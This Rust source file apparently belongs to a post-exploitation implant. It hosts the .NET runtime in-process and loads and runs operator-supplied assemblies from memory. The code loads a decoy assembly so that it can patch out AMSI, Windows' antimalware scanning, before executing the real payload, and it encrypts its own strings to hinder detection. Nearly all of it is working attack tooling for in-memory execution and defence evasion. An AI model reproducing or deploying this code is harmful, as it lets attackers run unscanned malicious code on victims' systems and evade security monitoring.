use std::{ffi::c_void, iter::once, ptr::null_mut};

use shared::{task_types::DotExDataForImplant, tasks::WyrmResult};
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::SysAllocString,
        System::{
            ClrHosting::{CLRCreateInstance, CorRuntimeHost},
            Com::SAFEARRAY,
            Ole::{
                SafeArrayAccessData, SafeArrayCreateVector, SafeArrayPutElement,
                SafeArrayUnaccessData,
            },
            Variant::{VARIANT, VT_ARRAY, VT_BSTR, VT_UI1, VT_VARIANT},
        },
    },
    core::GUID,
};

use crate::{
    evasion::patch_amsi_if_ft_flag,
    execute::ffi::{
        _AppDomain, _Assembly, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
    },
};

pub enum DotnetError {
    IntOverflow,
    ClrNotInitialised(i32),
    RuntimeNotInitialised(i32),
    CorHostNotInitialised(i32),
    CannotStartRuntime(i32),
    ArgPutFailed(i32),
    AssemblyDataNull,
    SafeArrayNotInitialised,
    SafeArrayAccessUnaccessFail(i32),
    BadEntrypoint(i32),
    Load3Failed(i32),
}

impl DotnetError {
    fn to_string(&self) -> String {
        match self {
            DotnetError::ClrNotInitialised(i) => {
                format!("{} {i:#X}", sc!("CLR was not initialised.", 73).unwrap())
            }
            DotnetError::RuntimeNotInitialised(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Runtime was not initialised.", 73).unwrap()
                )
            }
            DotnetError::CorHostNotInitialised(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Cor Host was not initialised.", 73).unwrap()
                )
            }
            DotnetError::CannotStartRuntime(i) => {
                format!("{} {i:#X}", sc!("Cannot start runtime.", 73).unwrap())
            }
            DotnetError::AssemblyDataNull => sc!("_Assembly data was null", 73).unwrap(),
            DotnetError::SafeArrayNotInitialised => {
                sc!("SAFEARRAY could not be initialised", 73).unwrap()
            }
            DotnetError::IntOverflow => sc!(
                "An int overflow occurred, not continuing with operation.",
                81
            )
            .unwrap(),
            DotnetError::ArgPutFailed(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Could not put args in commandline. Error code:", 73).unwrap()
                )
            }
            DotnetError::SafeArrayAccessUnaccessFail(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Could not access / unaccess a SAFEARRAY:", 73).unwrap()
                )
            }
            DotnetError::BadEntrypoint(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Could not get entrypoint of assembly:", 73).unwrap()
                )
            }
            DotnetError::Load3Failed(i) => {
                format!(
                    "{} {i:#X}",
                    sc!("Failed to load assembly into the process:", 73).unwrap()
                )
            }
        }
    }
}

const GUID_META_HOST: GUID = GUID {
    data1: 0x9280188d,
    data2: 0xe8e,
    data3: 0x4867,
    data4: [0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};

const GUID_RIID: GUID = GUID {
    data1: 0xD332DB9E,
    data2: 0xB9B3,
    data3: 0x4125,
    data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
};

const GUID_RNTIME_INFO: GUID = GUID {
    data1: 0xBD39D1D2,
    data2: 0xBA2F,
    data3: 0x486a,
    data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
};

const GUID_COR_RUNTIME: GUID = GUID {
    data1: 0xcb2f6722,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

const GUID_APP_DOMAIN: GUID = GUID {
    data1: 0x05F696DC,
    data2: 0x2B29,
    data3: 0x3663,
    data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
};

/// Entry function for executing dotnet binaries in the current process.
///
/// For simplicity, we accept the metadata un-decoded so the main dispatcher doesn't need to
/// concern itself with the intrinsics. This function will handle that.
pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<String> {
    if metadata.is_none() {
        return WyrmResult::Err(sc!("No metadata received with command.", 87).unwrap());
    }

    let deser = match serde_json::from_str::<DotExDataForImplant>(metadata.as_ref().unwrap()) {
        Ok(d) => d,
        Err(e) => {
            return WyrmResult::Err(format!(
                "{} {e}",
                sc!("Could not deserialise metadata", 76).unwrap()
            ));
        }
    };

    match execute_dotnet_assembly(&deser.0, &deser.1) {
        Ok(s) => WyrmResult::Ok(s),
        Err(e) => WyrmResult::Err(format!(
            "{} {}",
            sc!("Error received during execution:", 56).unwrap(),
            e.to_string()
        )),
    }
}

fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, DotnetError> {
    //
    // Load the CLR into the process and setup environment to support
    //
    let meta = create_clr_instance()?;
    let runtime = get_runtime_v4(meta)?;
    let host: *mut ICorRuntimeHost = get_cor_runtime_host(runtime)?;
    start_runtime(host)?;
    let app_domain = get_default_appdomain(host)?;

    let p_args = make_params(args)?;
    let p_sa = create_safe_array(buf)?;

    // Create a junk decoy safe array such that we force a load of AMSI to then patch out
    let decoy_buf = [0x00, 0x00, 0x00, 0x00];
    let p_decoy_sa = create_safe_array(&decoy_buf)?;

    //
    // First load the decoy binary into the process; this is to bring in amsi.dll such that we can patch
    // it should the operator have instructed the process to do so.
    // After that, then we can load in the target assembly via the same load_3.
    //
    let mut sp_assembly: *mut _Assembly = std::ptr::null_mut();
    let load_3 = unsafe { (*(*app_domain).vtable).Load_3 };

    // Decoy - the result here is expected to be an error, so we dont want to check for this.
    let _res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };

    // Now we can patch AMSI as it will have been loaded into the process by the above load_3
    patch_amsi_if_ft_flag();

    // Reset assembly data and load the assembly with AMSI patched
    sp_assembly = null_mut();
    let res = unsafe { load_3(app_domain as *mut _, p_sa, &mut sp_assembly) };
    if res != 0 {
        return Err(DotnetError::Load3Failed(res));
    }

    if sp_assembly.is_null() {
        return Err(DotnetError::AssemblyDataNull);
    }

    //
    // Get the entrypoint of the assembly, should be Main?
    //
    let mut entryp = null_mut();
    let res =
        unsafe { ((*(*sp_assembly).vtable).get_EntryPoint)(sp_assembly as *mut _, &mut entryp) };

    if res != 0 {
        return Err(DotnetError::BadEntrypoint(res));
    }

    let mut retval = VARIANT::default();
    let object = VARIANT::default();

    //
    // Now we can call the entrypoint via Invoke_3 which runs the assembly in our process
    //
    let vt = unsafe { &(*(*entryp).vtable) };
    unsafe { (vt.Invoke_3)(entryp as *mut _, object, p_args, &mut retval) };

    Ok(sc!("Dotnet task running", 49).unwrap())
}

fn make_params(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
    let bstr_array = args_to_safe_array(args)?;

    let outer = unsafe { SafeArrayCreateVector(VT_VARIANT as u16, 0, 1) };
    if outer.is_null() {
        return Err(DotnetError::SafeArrayNotInitialised);
    }

    //
    // Wrap the inner String[]
    //
    let mut v: VARIANT = unsafe { std::mem::zeroed() };

    v.Anonymous.Anonymous.vt = (VT_ARRAY | VT_BSTR) as u16;
    v.Anonymous.Anonymous.Anonymous.parray = bstr_array;

    let idx: i32 = 0;

    let res = unsafe { SafeArrayPutElement(outer, &idx, &mut v as *mut _ as *mut _) };
    if res != 0 {
        return Err(DotnetError::ArgPutFailed(res));
    }

    Ok(outer)
}

#[macro_export]
macro_rules! put_string_in_array {
    ($wide:expr, $p_sa:expr, $i:expr) => {{
        let res = unsafe {
            let p_str = SysAllocString($wide.as_ptr());
            SafeArrayPutElement($p_sa, &$i as *const _ as *const i32, p_str as *const _)
        };

        if res != 0 {
            return Err(DotnetError::ArgPutFailed(res));
        }
    }};
}

/// Converts arguments intended for the running assembly to a SAFEARRAY
fn args_to_safe_array(args: &[String]) -> Result<*mut SAFEARRAY, DotnetError> {
    let mut num_args = args.len();
    let mut has_args = true;

    if num_args == 0 {
        has_args = false;
        num_args = 1;
    }

    if num_args > u32::MAX as usize {
        return Err(DotnetError::IntOverflow);
    }

    let p_sa = unsafe { SafeArrayCreateVector(VT_BSTR as u16, 0, num_args as u32) };

    if p_sa.is_null() {
        return Err(DotnetError::SafeArrayNotInitialised);
    }

    //
    // If we have no args, just create an empty inner with 1 element, but 0 content.
    // If we do have args, then iterate over them placing them properly in the array as an alloc'd WString
    //
    if !has_args {
        let wide = vec![0u16];
        let i = 0;
        put_string_in_array!(wide, p_sa, i);
    } else {
        for (i, arg) in args.iter().enumerate() {
            let wide: Vec<u16> = arg.encode_utf16().chain(once(0)).collect();

            put_string_in_array!(wide, p_sa, i);
        }
    }

    Ok(p_sa)
}

fn create_safe_array(buf: &[u8]) -> Result<*mut SAFEARRAY, DotnetError> {
    let p_sa = unsafe { SafeArrayCreateVector(VT_UI1 as u16, 0, buf.len() as u32) };
    if p_sa.is_null() {
        return Err(DotnetError::SafeArrayNotInitialised);
    }

    let mut p_data = null_mut();
    let res = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
    if res != 0 {
        return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
    }

    unsafe { std::ptr::copy_nonoverlapping(buf.as_ptr(), p_data as *mut u8, buf.len()) };
    let res = unsafe { SafeArrayUnaccessData(p_sa) };
    if res != 0 {
        return Err(DotnetError::SafeArrayAccessUnaccessFail(res));
    }

    Ok(p_sa)
}

fn create_clr_instance() -> Result<*mut ICLRMetaHost, DotnetError> {
    let mut pp_interface = null_mut();

    let h_result = unsafe { CLRCreateInstance(&GUID_META_HOST, &GUID_RIID, &mut pp_interface) };

    if h_result != 0 {
        return Err(DotnetError::ClrNotInitialised(h_result));
    }

    Ok(pp_interface as *mut ICLRMetaHost)
}

fn get_runtime_v4(meta: *mut ICLRMetaHost) -> Result<*mut ICLRRuntimeInfo, DotnetError> {
    let vtbl = (unsafe { &*meta }).lpVtbl;
    let get_runtime = (unsafe { &*vtbl }).GetRuntime;

    let mut p_runtime: *mut c_void = null_mut();
    let ver: Vec<u16> = "v4.0.30319\0".encode_utf16().collect();

    let h_result = unsafe { get_runtime(meta, ver.as_ptr(), &GUID_RNTIME_INFO, &mut p_runtime) };
    if h_result < 0 {
        return Err(DotnetError::RuntimeNotInitialised(h_result));
    }
    Ok(p_runtime as *mut ICLRRuntimeInfo)
}

fn get_cor_runtime_host(
    runtime: *mut ICLRRuntimeInfo,
) -> Result<*mut ICorRuntimeHost, DotnetError> {
    let get_interface = unsafe { &*(*runtime).vtable }.GetInterface;

    let mut p_host: *mut c_void = std::ptr::null_mut();
    let h_result =
        unsafe { get_interface(runtime, &CorRuntimeHost, &GUID_COR_RUNTIME, &mut p_host) };
    if h_result < 0 {
        return Err(DotnetError::CorHostNotInitialised(h_result));
    }
    Ok(p_host as *mut ICorRuntimeHost)
}

fn start_runtime(host: *mut ICorRuntimeHost) -> Result<(), DotnetError> {
    let v_table = unsafe { &*(*host).vtable };

    let h_result = unsafe { (v_table.Start)(host) };
    if h_result < 0 {
        Err(DotnetError::CannotStartRuntime(h_result))
    } else {
        Ok(())
    }
}

fn get_default_appdomain(host: *mut ICorRuntimeHost) -> Result<*mut _AppDomain, DotnetError> {
    let host_vtbl = unsafe { &*(*host).vtable };

    let mut unk = null_mut();
    let hr = unsafe { (host_vtbl.GetDefaultDomain)(host, &mut unk as *mut *mut _) };
    if hr < 0 {
        return Err(DotnetError::CorHostNotInitialised(hr));
    }

    let unk = unk as *mut IUnknown;
    let query_interface = unsafe { (*(*unk).lpVtbl).QueryInterface };
    let mut appdomain_ptr: *mut c_void = null_mut();

    let hr = unsafe { query_interface(unk, &GUID_APP_DOMAIN, &mut appdomain_ptr) };
    if hr < 0 {
        return Err(DotnetError::CorHostNotInitialised(hr));
    }

    Ok(appdomain_ptr as *mut _AppDomain)
}
